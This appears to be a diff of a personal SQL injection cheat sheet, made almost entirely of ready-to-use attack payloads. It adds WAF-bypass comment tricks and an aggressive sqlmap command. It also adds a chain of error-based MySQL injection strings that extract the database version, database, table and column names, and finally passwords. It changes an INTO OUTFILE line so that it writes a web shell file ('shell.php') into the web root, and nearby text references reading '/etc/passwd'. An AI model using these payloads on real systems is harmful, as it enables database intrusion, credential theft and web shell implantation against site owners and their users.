@@ -49,12 +49,52 @@ load_file('/etc/passwd')
 
 Into outfile:
 
-+INTO+OUTFILE+'/var/www/html/pescyte.php'
++INTO+OUTFILE+'/var/www/html/shell.php'
 
 
+waf bypass:
+
+/*!sqli*/
+
+/*!50000/*!sqli*/*/
+
+/*!13337sqli*/
+
+don/**/omet/**/hasan
+
+
+sqlmap command with cookie
+
+sqlmap -r target.txt -v 3 --time-sec=10 --level=5 --risk=3
 
 
 Error based sqli Notes:
+
+Get version:
+
++OR+1+GROUP+BY+CONCAT_WS(0x3a,VERSION(),FLOOR(RAND(0)*2))+HAVING+MIN(0)+OR+1
+
+Get database:
+
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(DATABASE()+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=DATABASE()+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+
+Get tables:
+
++AND(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(table_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.TABLES+WHERE+table_schema=0x6f6d6574686173616e+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+Get coloumn:
+
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(column_name+AS+CHAR),0x7e))+FROM+INFORMATION_SCHEMA.COLUMNS+WHERE+table_name=0x646f6e+AND+table_schema=0x6f6d6574686173616e+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+
+Get data:
+
++AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(password)+AS+CHAR),0x7e))+FROM+omethasan.don+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)
+
+
+
+
 
 
 
